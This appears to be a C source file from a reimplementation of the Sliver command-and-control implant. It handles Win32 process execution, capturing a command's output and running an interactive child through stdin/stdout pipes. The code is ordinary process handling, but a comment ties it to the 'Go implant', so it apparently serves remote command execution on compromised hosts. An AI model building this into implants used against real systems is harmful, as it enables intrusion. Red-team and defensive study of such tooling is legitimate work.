/* src/platform/win32/exec.c - capture a child process (Win32). */
#include "sliver/proc.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>

#include "sliver/proto.h"

static void drain(HANDLE h, sliver_buf_t *out) {
  char buf[4096];
  DWORD got = 0;
  while (ReadFile(h, buf, sizeof(buf), &got, NULL) && got > 0) {
    (void)sliver_buf_append(out, buf, got);
  }
}

/* CreateProcess does not search PATH reliably for a bare name: resolve it first
 * so `execute -o cmd /c ...` works like it does in the Go implant. */
static void resolve_exe(const char *path, char *out, size_t cap) {
  char found[MAX_PATH];
  DWORD n;

  (void)snprintf(out, cap, "%s", path);
  if (path == NULL || strchr(path, '\\') != NULL || strchr(path, '/') != NULL) {
    return;
  }
  n = SearchPathA(NULL, path, ".exe", MAX_PATH, found, NULL);
  if (n > 0 && n < MAX_PATH) {
    (void)snprintf(out, cap, "%s", found);
  }
}

static void append_quoted(char *dst, size_t cap, size_t *offset, const char *arg) {
  int need_quotes = (arg == NULL) || (arg[0] == '\0') || (strpbrk(arg, " \t") != NULL);
  if (need_quotes) {
    *offset += (size_t)snprintf(dst + *offset, cap - *offset, "\"%s\"", arg != NULL ? arg : "");
  } else {
    *offset += (size_t)snprintf(dst + *offset, cap - *offset, "%s", arg);
  }
}

int sliver_proc_exec(const char *path, const char *const *args, size_t argc, int capture,
                     sliver_buf_t *out, sliver_buf_t *err, uint32_t *pid_out,
                     uint32_t *status_out) {
  SECURITY_ATTRIBUTES sa;
  STARTUPINFOA si;
  PROCESS_INFORMATION pi;
  HANDLE out_r = NULL, out_w = NULL, err_r = NULL, err_w = NULL;
  char cmdline[8192];
  size_t offset = 0;
  DWORD exit_code = 0;

  if (path == NULL) {
    return -1;
  }
  memset(&sa, 0, sizeof(sa));
  sa.nLength = sizeof(sa);
  sa.bInheritHandle = TRUE;
  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  memset(&pi, 0, sizeof(pi));

  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
  si.hStdOutput = GetStdHandle(STD_OUTPUT_HANDLE);
  si.hStdError = GetStdHandle(STD_ERROR_HANDLE);
  if (capture) {
    if (!CreatePipe(&out_r, &out_w, &sa, 0) || !SetHandleInformation(out_r, HANDLE_FLAG_INHERIT, 0)) {
      return -1;
    }
    if (!CreatePipe(&err_r, &err_w, &sa, 0) || !SetHandleInformation(err_r, HANDLE_FLAG_INHERIT, 0)) {
      (void)CloseHandle(out_r);
      (void)CloseHandle(out_w);
      return -1;
    }
    si.hStdOutput = out_w;
    si.hStdError = err_w;
  }

  /* Quote only the arguments that need it: quoting a switch such as /c breaks
   * cmd.exe parsing (`cmd.exe "/c" "echo hi"`). */
  append_quoted(cmdline, sizeof(cmdline), &offset, path);
  for (size_t i = 0; i < argc && offset < sizeof(cmdline); ++i) {
    offset += (size_t)snprintf(cmdline + offset, sizeof(cmdline) - offset, " ");
    append_quoted(cmdline, sizeof(cmdline), &offset, args[i]);
  }
  {
    char resolved[MAX_PATH * 2];
    resolve_exe(path, resolved, sizeof(resolved));
    if (!CreateProcessA(resolved, cmdline, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
      if (capture) {
        (void)CloseHandle(out_r);
        (void)CloseHandle(out_w);
        (void)CloseHandle(err_r);
        (void)CloseHandle(err_w);
      }
      return -1;
    }
  }
  if (capture) {
    (void)CloseHandle(out_w);
    (void)CloseHandle(err_w);
  }
  (void)WaitForSingleObject(pi.hProcess, 60000);
  if (capture) {
    drain(out_r, out);
    drain(err_r, err);
    (void)CloseHandle(out_r);
    (void)CloseHandle(err_r);
  }
  (void)GetExitCodeProcess(pi.hProcess, &exit_code);
  if (pid_out != NULL) {
    *pid_out = (uint32_t)pi.dwProcessId;
  }
  if (status_out != NULL) {
    *status_out = (uint32_t)exit_code;
  }
  (void)CloseHandle(pi.hThread);
  (void)CloseHandle(pi.hProcess);
  return 0;
}


/* --- interactive child ------------------------------------------------- */
struct sliver_child {
  HANDLE stdin_w;
  HANDLE stdout_r;
  HANDLE proc;
  HANDLE thread;
};

int sliver_child_spawn(const char *path, const char *const *args, size_t argc,
                       sliver_child_t **out, uint32_t *pid_out) {
  SECURITY_ATTRIBUTES sa;
  STARTUPINFOA si;
  PROCESS_INFORMATION pi;
  HANDLE in_r = NULL, in_w = NULL, out_r = NULL, out_w = NULL;
  sliver_child_t *child;
  char cmdline[8192];
  size_t offset = 0;

  if (path == NULL || out == NULL) {
    return -1;
  }
  memset(&sa, 0, sizeof(sa));
  sa.nLength = sizeof(sa);
  sa.bInheritHandle = TRUE;
  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  memset(&pi, 0, sizeof(pi));

  if (!CreatePipe(&in_r, &in_w, &sa, 0) || !SetHandleInformation(in_w, HANDLE_FLAG_INHERIT, 0)) {
    return -1;
  }
  if (!CreatePipe(&out_r, &out_w, &sa, 0) || !SetHandleInformation(out_r, HANDLE_FLAG_INHERIT, 0)) {
    (void)CloseHandle(in_r);
    (void)CloseHandle(in_w);
    return -1;
  }
  si.dwFlags = STARTF_USESTDHANDLES;
  si.hStdInput = in_r;
  si.hStdOutput = out_w;
  si.hStdError = out_w;

  append_quoted(cmdline, sizeof(cmdline), &offset, path);
  for (size_t i = 0; i < argc && offset < sizeof(cmdline); ++i) {
    offset += (size_t)snprintf(cmdline + offset, sizeof(cmdline) - offset, " ");
    append_quoted(cmdline, sizeof(cmdline), &offset, args[i]);
  }
  {
    char resolved[MAX_PATH * 2];
    resolve_exe(path, resolved, sizeof(resolved));
    if (!CreateProcessA(resolved, cmdline, NULL, NULL, TRUE, CREATE_NEW_PROCESS_GROUP, NULL, NULL,
                        &si, &pi)) {
      (void)CloseHandle(in_r);
      (void)CloseHandle(in_w);
      (void)CloseHandle(out_r);
      (void)CloseHandle(out_w);
      return -1;
    }
  }
  (void)CloseHandle(in_r);
  (void)CloseHandle(out_w);

  child = (sliver_child_t *)calloc(1, sizeof(*child));
  if (child == NULL) {
    (void)TerminateProcess(pi.hProcess, 1);
    (void)CloseHandle(pi.hProcess);
    (void)CloseHandle(pi.hThread);
    (void)CloseHandle(in_w);
    (void)CloseHandle(out_r);
    return -1;
  }
  child->stdin_w = in_w;
  child->stdout_r = out_r;
  child->proc = pi.hProcess;
  child->thread = pi.hThread;
  *out = child;
  if (pid_out != NULL) {
    *pid_out = (uint32_t)pi.dwProcessId;
  }
  return 0;
}

long sliver_child_write(sliver_child_t *c, const void *buf, size_t len) {
  DWORD written = 0;
  if (c == NULL || c->stdin_w == NULL) {
    return -1;
  }
  if (!WriteFile(c->stdin_w, buf, (DWORD)len, &written, NULL)) {
    return -1;
  }
  return (long)written;
}

long sliver_child_read(sliver_child_t *c, void *buf, size_t len) {
  DWORD got = 0;
  if (c == NULL || c->stdout_r == NULL) {
    return -1;
  }
  if (!ReadFile(c->stdout_r, buf, (DWORD)len, &got, NULL)) {
    return 0;
  }
  return (long)got;
}

void sliver_child_close_stdin(sliver_child_t *c) {
  if (c != NULL && c->stdin_w != NULL) {
    (void)CloseHandle(c->stdin_w);
    c->stdin_w = NULL;
  }
}

int sliver_child_wait(sliver_child_t *c, uint32_t *status_out) {
  DWORD code = 0;
  if (c == NULL || c->proc == NULL) {
    return -1;
  }
  (void)WaitForSingleObject(c->proc, 60000);
  (void)GetExitCodeProcess(c->proc, &code);
  if (status_out != NULL) {
    *status_out = (uint32_t)code;
  }
  return 0;
}

void sliver_child_terminate(sliver_child_t *c) {
  if (c != NULL && c->proc != NULL) {
    (void)TerminateProcess(c->proc, 1);
  }
}

void sliver_child_free(sliver_child_t *c) {
  if (c == NULL) {
    return;
  }
  sliver_child_close_stdin(c);
  if (c->stdout_r != NULL) {
    (void)CloseHandle(c->stdout_r);
  }
  if (c->thread != NULL) {
    (void)CloseHandle(c->thread);
  }
  if (c->proc != NULL) {
    (void)CloseHandle(c->proc);
  }
  free(c);
}




